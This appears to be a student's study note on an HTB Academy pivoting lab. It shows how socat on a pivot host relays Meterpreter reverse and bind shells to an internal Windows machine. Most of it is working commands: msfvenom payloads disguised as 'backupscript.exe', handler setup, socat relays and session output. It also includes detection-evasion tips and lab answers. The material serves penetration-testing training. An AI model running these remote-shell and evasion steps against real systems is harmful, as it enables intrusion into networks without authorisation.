# 🔄 Socat Redirection with a Reverse Shell - CPTS

## **Overview**

Socat is a bidirectional relay tool that can create pipe sockets between two independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. This makes Socat an excellent tool for pivoting and traffic redirection scenarios.

**Based on HTB Academy Page 6: Socat Redirection with a Reverse Shell**

---

## **Scenario Description**

### **Network Topology**
```
[Attack Host] ←→ [Ubuntu Pivot] ←→ [Windows Target]
10.10.14.18        10.129.202.64      172.16.5.19
   :80             172.16.5.129       (Internal Only)
                   (Socat Listener)
```

### **The Approach**
- **Socat as redirector** on Ubuntu pivot host
- **No SSH tunneling required** - direct TCP forwarding
- **Bidirectional relay** between network channels
- **Simple traffic forwarding** from pivot to attack host

---

## **Socat Fundamentals**

### **What is Socat?**

Socat (SOcket CAT) is a command-line utility that:
- **Creates bidirectional data transfers** between two endpoints
- **Supports various protocols** (TCP, UDP, SSL, etc.)
- **Acts as a network relay** without complex setup
- **Provides port forwarding** functionality
- **Works independently** of SSH or other tunneling protocols

### **Key Advantages**
1. **No SSH dependency** - works with any network connection
2. **Simple syntax** - easy to understand and implement
3. **Bidirectional** - handles traffic in both directions
4. **Protocol agnostic** - supports multiple network protocols
5. **Lightweight** - minimal resource consumption

---

## **1. Basic Socat Redirection Setup**

### **Starting Socat Listener on Pivot**

```bash
# On Ubuntu pivot host (172.16.5.129)
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Command breakdown:
# TCP4-LISTEN:8080    - Listen on TCP port 8080
# fork                - Handle multiple connections
# TCP4:10.10.14.18:80 - Forward to attack host port 80
```

**Configuration Explanation:**
- **Listen Port:** 8080 (on pivot host)
- **Target:** 10.10.14.18:80 (attack host)
- **Fork:** Creates new process for each connection
- **Protocol:** TCP IPv4

---

## **2. Payload Creation and Handler Setup**

### **Creating Windows Payload**

```bash
# Create Windows HTTPS Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Expected Output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

**Key Points:**
- **LHOST:** Points to pivot host internal IP (172.16.5.129)
- **LPORT:** Points to Socat listener port (8080)
- **Format:** Windows executable for target host

### **Configure Metasploit Handler**

```bash
# Start msfconsole
sudo msfconsole

# Configure multi/handler
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0

msf6 exploit(multi/handler) > set lport 80
lport => 80

msf6 exploit(multi/handler) > run

# Expected Output:
[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

**Handler Configuration:**
- **LHOST:** 0.0.0.0 (listen on all interfaces)
- **LPORT:** 80 (port that Socat forwards to)
- **Payload:** Matches the generated payload

---

## **3. Traffic Flow Analysis**

### **Connection Path**
```
[Windows Target] → [Socat Listener] → [Attack Host Handler]
172.16.5.19        172.16.5.129:8080   10.10.14.18:80
```

### **Step-by-Step Flow**
1. **Windows payload executes** and connects to 172.16.5.129:8080
2. **Socat receives connection** on port 8080
3. **Socat forwards traffic** to 10.10.14.18:80
4. **Attack host handler** receives forwarded connection
5. **Meterpreter session** established through relay

### **Network Perspective**
```bash
# From Windows target perspective:
Connection to: 172.16.5.129:8080

# From attack host perspective:
Connection from: 10.129.202.64 (pivot host IP)

# Socat acts as transparent proxy
```

---

## **4. Establishing the Meterpreter Session**

### **Execution and Connection**

```bash
# Execute payload on Windows target
C:\> backupscript.exe

# Handler receives connection through Socat
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

**Success Indicators:**
- Connection appears to come from pivot host (10.129.202.64)
- Meterpreter session established successfully
- Commands execute on Windows target
- Traffic flows transparently through Socat

---

## **5. Advanced Socat Configurations**

### **Multiple Port Forwarding**

```bash
# Forward multiple ports simultaneously
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &
socat TCP4-LISTEN:8443,fork TCP4:10.10.14.18:443 &
socat TCP4-LISTEN:3389,fork TCP4:10.10.14.18:3389 &

# Background processes for persistent forwarding
```

### **UDP Traffic Forwarding**

```bash
# Forward UDP traffic (for DNS tunneling, etc.)
socat UDP4-LISTEN:53,fork UDP4:10.10.14.18:53

# Useful for DNS-based payloads or tunneling
```

### **SSL/TLS Forwarding**

```bash
# Forward SSL traffic with certificate
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP4:10.10.14.18:443

# Provides encrypted channel for sensitive traffic
```

### **Persistent Forwarding**

```bash
# Create persistent Socat forwarding with retry
while true; do
    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
    sleep 5
done
```

---

## **6. Socat vs Other Pivoting Methods**

| **Aspect** | **Socat** | **SSH Tunneling** | **Meterpreter portfwd** |
|------------|-----------|-------------------|--------------------------|
| **Setup Complexity** | Simple | Moderate | Requires Meterpreter |
| **SSH Dependency** | No | Yes | No |
| **Protocol Support** | Multiple | TCP primarily | TCP |
| **Resource Usage** | Low | Low | Medium |
| **Stealth** | Medium | High | Low |
| **Flexibility** | High | High | Medium |

---

## **7. Practical Use Cases**

### **Scenario 1: Web Server Redirection**
```bash
# Redirect web traffic from pivot to attack host
socat TCP4-LISTEN:80,fork TCP4:10.10.14.18:8080

# Windows targets connect to pivot:80, redirected to attack:8080
```

### **Scenario 2: RDP Forwarding**
```bash
# Forward RDP traffic for lateral movement
socat TCP4-LISTEN:3389,fork TCP4:172.16.5.19:3389

# Attack host can RDP to pivot:3389, reaching internal Windows host
```

### **Scenario 3: Multi-Protocol Relay**
```bash
# HTTP and HTTPS forwarding simultaneously
socat TCP4-LISTEN:80,fork TCP4:10.10.14.18:8080 &
socat TCP4-LISTEN:443,fork TCP4:10.10.14.18:8443 &

# Comprehensive web traffic redirection
```

---

## **8. Security Considerations**

### **Operational Security**
1. **Monitor Socat processes** - can be detected by defenders
2. **Use common ports** when possible (80, 443, 53)
3. **Clean up processes** after assessment completion
4. **Consider traffic patterns** - avoid suspicious volumes

### **Network Detection**
1. **Socat creates network connections** - visible in netstat
2. **Process monitoring** can detect socat execution
3. **Traffic analysis** may reveal forwarding patterns
4. **Log correlation** between pivot and target communications

### **Mitigation Strategies**
1. **Use during maintenance windows** when possible
2. **Mimic legitimate traffic** patterns
3. **Rotate ports and timing** to avoid detection
4. **Monitor for defensive responses**

---

## **9. Troubleshooting Common Issues**

### **Connection Failures**

```bash
# Test basic connectivity
telnet 172.16.5.129 8080

# Check if Socat is listening
netstat -tlnp | grep 8080

# Verify port accessibility
nc -v 172.16.5.129 8080
```

### **Socat Process Issues**

```bash
# Check running Socat processes
ps aux | grep socat

# Kill stuck Socat processes
pkill socat

# Restart with debug output
socat -d -d TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### **Handler Connection Problems**

```bash
# Verify handler is listening
netstat -tlnp | grep :80

# Check firewall rules
iptables -L INPUT | grep 80

# Test direct connection to handler
telnet 10.10.14.18 80
```

---

## **10. HTB Academy Lab Questions**

### **Question: SSH Tunneling Requirement**
**"SSH tunneling is required with Socat. True or False?"**

**Answer:** `False`

**Explanation:** 
- Socat works **independently** of SSH tunneling
- It creates **direct TCP/UDP relays** between endpoints
- **No SSH dependency** required for basic operation
- Can work over **any network connection**
- SSH may be used to **establish initial access** to pivot host
- But Socat itself **does not require SSH** for traffic forwarding

**Technical Justification:**
```bash
# Socat creates direct socket connections
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# This command creates a direct TCP relay without SSH
# Traffic flows: Target → Pivot:8080 → Attack:80
# No SSH tunnel involved in the actual forwarding
```

---

## **11. Best Practices**

### **Deployment**
1. **Test connectivity** before payload execution
2. **Use background processes** for persistent forwarding
3. **Monitor resource usage** on pivot host
4. **Document forwarding configurations**

### **Cleanup**
1. **Kill Socat processes** after assessment
2. **Remove payload files** from target systems
3. **Clear process history** if possible
4. **Document all activities** for reporting

### **Optimization**
1. **Choose appropriate ports** for target environment
2. **Use fork option** for multiple connections
3. **Consider protocol requirements** (TCP vs UDP)
4. **Monitor traffic volume** and patterns

---

## **12. Command Reference**

### **Basic Socat Commands**
```bash
# TCP forwarding
socat TCP4-LISTEN:PORT,fork TCP4:TARGET_IP:TARGET_PORT

# UDP forwarding  
socat UDP4-LISTEN:PORT,fork UDP4:TARGET_IP:TARGET_PORT

# SSL forwarding
socat OPENSSL-LISTEN:PORT,cert=CERT,fork TCP4:TARGET_IP:TARGET_PORT

# Background execution
socat TCP4-LISTEN:PORT,fork TCP4:TARGET_IP:TARGET_PORT &

# Process management
ps aux | grep socat
pkill socat
```

### **Testing and Verification**
```bash
# Test connectivity
telnet PIVOT_IP PORT
nc -v PIVOT_IP PORT

# Check listening ports
netstat -tlnp | grep PORT
ss -tlnp | grep PORT

# Monitor traffic
tcpdump -i any port PORT
```

---

## **13. Integration with Other Techniques**

### **Combined with SSH**
```bash
# SSH to pivot, then start Socat
ssh ubuntu@10.129.202.64 "socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80"

# Combines SSH access with Socat forwarding
```

### **Multiple Socat Instances**
```bash
# Chain multiple Socat instances for complex routing
# Pivot1: socat TCP4-LISTEN:8080,fork TCP4:PIVOT2_IP:8080
# Pivot2: socat TCP4-LISTEN:8080,fork TCP4:ATTACK_IP:80
```

### **With Meterpreter**
```bash
# Use Socat for initial access, then establish Meterpreter
# 1. Socat forwards initial payload
# 2. Meterpreter session provides advanced capabilities
# 3. Combine both for comprehensive access
```

---

## **14. Socat Bind Shell Redirection (HTB Academy Page 7)**

### **Bind Shell vs Reverse Shell Comparison**

| **Aspect** | **Reverse Shell** | **Bind Shell** |
|------------|-------------------|----------------|
| **Direction** | Target connects to attacker | Attacker connects to target |
| **Listener Location** | Attack host | Target host |
| **Firewall Bypass** | Better (outbound) | Limited (inbound) |
| **Detection Risk** | Lower | Higher |
| **Use Case** | Standard pivoting | Specific scenarios |

### **Bind Shell Network Topology**
```
[Attack Host] → [Ubuntu Pivot] → [Windows Target]
10.10.14.18     10.129.202.64     172.16.5.19
Metasploit      Socat Listener    Bind Shell
Handler         :8080 → :8443     :8443
```

### **Traffic Flow Analysis**
```
[Metasploit Handler] → [Pivot:8080] → [Socat Forward] → [Windows:8443]
Connection initiated    Receives from    Forwards to      Bind shell waits
by attacker            attack host      target           for connection
```

---

## **15. Implementing Socat Bind Shell Redirection**

### **Step 1: Create Windows Bind Shell Payload**

```bash
# Generate bind TCP Meterpreter payload
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Expected Output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

**Key Configuration:**
- **Payload:** `windows/x64/meterpreter/bind_tcp`
- **LPORT:** 8443 (port where Windows will listen)
- **No LHOST needed** - bind shell listens locally

### **Step 2: Configure Socat Bind Shell Listener**

```bash
# On Ubuntu pivot host
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Configuration breakdown:
# TCP4-LISTEN:8080    - Listen on pivot port 8080
# fork                - Handle multiple connections  
# TCP4:172.16.5.19:8443 - Forward to Windows bind shell
```

**Listener Configuration:**
- **Pivot Listen Port:** 8080 (attack host connects here)
- **Target:** 172.16.5.19:8443 (Windows bind shell)
- **Direction:** Pivot → Windows (forward mode)

### **Step 3: Execute Bind Shell on Windows**

```bash
# Transfer and execute payload on Windows target
C:\> backupjob.exe

# Payload starts listening on port 8443
# Waiting for incoming connections
```

### **Step 4: Configure Metasploit Bind Handler**

```bash
# Configure bind handler to connect to socat
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run

# Expected Output:
[*] Started bind TCP handler against 10.129.202.64:8080
```

**Handler Configuration:**
- **RHOST:** Pivot host IP (10.129.202.64)  
- **LPORT:** Socat listener port (8080)
- **Payload:** Must match bind shell payload

### **Step 5: Establish Meterpreter Session**

```bash
# Handler connects through Socat to Windows bind shell
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

**Success Indicators:**
- Handler connects to pivot host (10.129.202.64)
- Session established through Socat forwarding
- Commands execute on Windows target
- Connection path: Attack → Pivot → Windows

---

## **16. Bind Shell Advanced Scenarios**

### **Multiple Bind Shell Forwarding**

```bash
# Forward multiple bind shells simultaneously
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &
socat TCP4-LISTEN:8081,fork TCP4:172.16.5.20:8443 &
socat TCP4-LISTEN:8082,fork TCP4:172.16.5.21:8443 &

# Different targets, same bind shell port
```

### **Port Mapping for Bind Shells**

```bash
# Map different external ports to same internal port
socat TCP4-LISTEN:9001,fork TCP4:172.16.5.19:8443 &
socat TCP4-LISTEN:9002,fork TCP4:172.16.5.19:8444 &

# Access different services on same target
```

### **Persistent Bind Shell Forwarding**

```bash
# Ensure persistent forwarding with retry logic
while true; do
    socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
    echo "Socat died, restarting..."
    sleep 5
done
```

---

## **17. Bind Shell Security Considerations**

### **Increased Detection Risk**
1. **Inbound connections** are more suspicious
2. **Listening ports** on targets are detectable
3. **Firewall rules** may block inbound traffic
4. **Network monitoring** can identify bind shells

### **Operational Challenges**
1. **Target firewall** may block inbound connections
2. **NAT/Proxy issues** can prevent access
3. **Port conflicts** with existing services
4. **Persistence** requires payload to keep running

### **When to Use Bind Shells**
1. **Specific network configurations** requiring inbound
2. **Callback restrictions** in target environment
3. **Multiple handler sessions** to same target
4. **Persistence scenarios** where reverse shells fail

---

## **18. HTB Academy Lab Questions (Page 7)**

### **Question: Meterpreter Payload Identification**
**"What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)"**

**Answer:** `windows/x64/meterpreter/bind_tcp`

**Explanation:**
- **Payload Type:** Bind TCP (not reverse)
- **Architecture:** x64 (64-bit Windows)
- **Framework:** Meterpreter (advanced shell)
- **Protocol:** TCP (standard networking)

**Technical Verification:**
```bash
# Payload generation command shows full path
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Handler configuration confirms payload path
set payload windows/x64/meterpreter/bind_tcp
```

---

## **19. Troubleshooting Bind Shell Issues**

### **Common Problems**

**1. Bind Shell Not Listening**
```bash
# Check if payload is running on Windows
netstat -an | findstr :8443

# Verify process is active
tasklist | findstr backupjob.exe
```

**2. Socat Forward Not Working**
```bash
# Test connectivity to bind shell
nc -v 172.16.5.19 8443

# Check socat process
ps aux | grep socat
netstat -tlnp | grep 8080
```

**3. Handler Connection Fails**
```bash
# Test connection to socat listener
telnet 10.129.202.64 8080

# Verify handler configuration
show options
```

### **Debugging Commands**

```bash
# Enable socat debugging
socat -d -d TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Monitor network connections
tcpdump -i any port 8080 or port 8443

# Check Windows firewall
netsh advfirewall show allprofiles
```

---

## **20. Bind vs Reverse Shell Decision Matrix**

### **Use Bind Shells When:**
✅ **Firewall blocks outbound** connections  
✅ **Multiple sessions needed** to same target  
✅ **Persistent access required** despite payload restarts  
✅ **Network architecture** favors inbound connections  

### **Use Reverse Shells When:**
✅ **Firewall blocks inbound** connections (most common)  
✅ **NAT/Proxy environments** present  
✅ **Stealth is priority** (outbound less suspicious)  
✅ **Standard penetration testing** scenarios  

### **Hybrid Approach:**
```bash
# Use both for redundancy
# 1. Start with reverse shell for initial access
# 2. Establish bind shell for persistent access
# 3. Use socat to forward both as needed
```

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Pages 6 & 7
- **Socat Manual**: [Official Documentation](http://www.dest-unreach.org/socat/doc/socat.html)
- **SANS**: [Socat for Port Forwarding](https://www.sans.org/blog/socat-redirection/)
- **Penetration Testing**: [Socat Cheat Sheet](https://highon.coffee/blog/socat-cheat-sheet/)
- **Red Team Notes**: [Socat Pivoting Techniques](https://ired.team/offensive-security/lateral-movement/socat-redirection) 